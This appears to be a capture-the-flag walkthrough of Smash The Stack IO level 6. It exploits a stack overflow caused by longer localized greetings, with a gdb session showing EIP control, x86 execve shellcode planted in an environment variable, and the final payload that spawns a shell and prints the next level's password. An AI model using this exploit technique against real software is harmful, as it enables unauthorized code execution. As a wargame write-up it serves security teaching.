---
title: "Smash The Stack: IO Level 6 Walkthrough"
date: 2014-12-05T00:28:10+00:00
url: "/smash-stack-level6/"
draft: false
description: "A walkthrough of Level 6 on Smash The Stack IO, exploiting struct alignment, language localization buffers, and environment variable shellcode injection."
categories: ["exploit-dev", "Linux", "Security"]
tags: ["smashthestack", "wargame", "buffer-overflow", "env-injection", "reversing"]
---

Level 6 on the Smash The Stack IO wargame takes two command-line arguments (username and password) and prints a greeting:

```bash
level6@io:/levels$ ./level06 user pass
Hi user
```

Notice that the application checks the `LANG` environment variable to determine which greeting to print:

```bash
level6@io:/levels$ export LANG=fr
level6@io:/levels$ ./level06 user pass
Bienvenue user

level6@io:/levels$ export LANG=de
level6@io:/levels$ ./level06 user pass
Willkommen user
```

### Vulnerability Analysis

The program structure internally organizes credentials into a record:

```c
struct UserRecord {
    char name[40];
    char password[32];
    int id;
};
```

When building the greeting message, the program concatenates the localized greeting string with the user fields. Because localized strings like `"Bienvenue "` or `"Willkommen "` are longer than `"Hi "`, the destination buffer overflows when combined with maximum-length user and password strings.

### Controlling EIP

With `LANG=de` or `LANG=fr`, providing oversized arguments corrupts the stack frame:

```bash
level6@io:/levels$ gdb -q ./level06
(gdb) r $(python -c "print 'A'*100 + ' ' + 'B'*200")
Willkommen AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

`EIP` is cleanly overwritten with `0x42424242` (`BBBB`).

### Exploitation Strategy: Environment Variable Shellcode

Because the argument buffers are tightly constrained, storing shellcode inside an environment variable provides ample room and a predictable target address:

1. **Export shellcode in an environment variable:**
   ```bash
   export EGG=$(python -c "print '\x90'*64 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
   ```

2. **Locate the environment variable in memory:**
   Inspecting the stack under GDB reveals our `EGG` address around `0xbfffffb4`.

3. **Determine the exact offset to EIP:**
   - First argument (username): 40 bytes (`'A' * 40`).
   - Second argument (password): 26 bytes of padding (`'B' * 26`) + 4-byte target return address.

### Executing the Exploit

Running the binary with our calculated offset and target address:

```bash
level6@io:/levels$ ./level06 $(python -c "print 'A' * 40 + ' ' + 'B' * 26 + '\xb4\xff\xff\xbf'")
Bienvenue AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBB
sh-4.2$ whoami
level7
sh-4.2$ cat /home/level7/.pass
Nsr869Iyc0sFCX7I
```

The payload hijacks control flow into the NOP sled inside our environment variable and spawns a shell as `level7`.
